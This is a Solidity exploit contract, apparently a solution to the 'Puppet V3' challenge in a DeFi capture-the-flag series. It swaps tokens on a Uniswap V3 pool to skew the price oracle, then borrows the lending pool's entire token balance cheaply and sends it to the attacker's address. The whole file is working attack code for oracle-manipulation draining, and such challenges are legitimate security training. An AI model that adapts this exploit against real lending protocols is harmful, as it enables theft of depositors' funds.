// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "./PuppetV3Pool.sol";

import "hardhat/console.sol";

/**
 * @title PuppetV3Attack
 * @notice
 * @author soyccan (soyccan@gmail.com)
 */
contract PuppetV3Attack is IUniswapV3SwapCallback {
    IERC20Minimal public immutable weth;
    IERC20Minimal public immutable token;
    IUniswapV3Pool public immutable uniswapV3Pool;
    PuppetV3Pool public immutable lendingPool;
    address public immutable attacker;

    event Borrowed(address indexed borrower, uint256 depositAmount, uint256 borrowAmount);

    constructor(
        IERC20Minimal _weth,
        IERC20Minimal _token,
        IUniswapV3Pool _uniswapV3Pool,
        PuppetV3Pool _lendingPool
    ) {
        weth = _weth;
        token = _token;
        uniswapV3Pool = _uniswapV3Pool;
        lendingPool = _lendingPool;
        attacker = msg.sender;
    }

    function swap(int256 amount) external {
        // swap DVT for WETH
        uniswapV3Pool.swap(
            address(this), // recipient
            false, // zeroForOne
            amount, // amountSpecified
            TickMath.MAX_SQRT_RATIO - 1, // sqrtRatioLimitX96
            "" // data
        );
    }

    function borrow() external {
        uint256 borrowAmount = token.balanceOf(address(lendingPool));
        uint256 collateralRequired = lendingPool.calculateDepositOfWETHRequired(
            borrowAmount
        );
        console.log("need collateral:", collateralRequired / 10 ** 18, "WETH");

        if (weth.balanceOf(address(this)) < collateralRequired) return;

        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(borrowAmount);
        token.transfer(address(attacker), borrowAmount);
        emit Borrowed(msg.sender, collateralRequired, borrowAmount);
    }

    function uniswapV3SwapCallback(
        int256,
        int256 amount1Delta,
        bytes calldata
    ) external override {
        // transfer DVT to uniswap pool
        token.transferFrom(
            address(attacker),
            address(uniswapV3Pool),
            uint256(amount1Delta)
        );
    }
}
